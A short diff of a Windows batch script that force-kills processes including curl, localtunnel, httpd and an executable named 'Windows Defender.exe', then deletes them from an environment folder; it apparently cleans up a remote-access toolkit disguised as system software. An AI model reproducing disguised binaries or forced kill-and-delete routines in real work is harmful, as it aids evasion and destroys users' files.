@@ -17,7 +17,6 @@ taskkill /f /im curl.exe
 taskkill /f /im "Windows Defender.exe"
 taskkill /f /im localtunnel.exe
 taskkill /f /im httpd.exe
-taskkill /f /im ffmpeg.exe
 powershell.exe Remove-Item -Force '%environment%\Windows Defender.exe'
 powershell.exe Remove-Item -Force -Recurse "%environment%\localtunnel"
 powershell.exe Remove-Item -Force "%environment%\nircmd.exe"
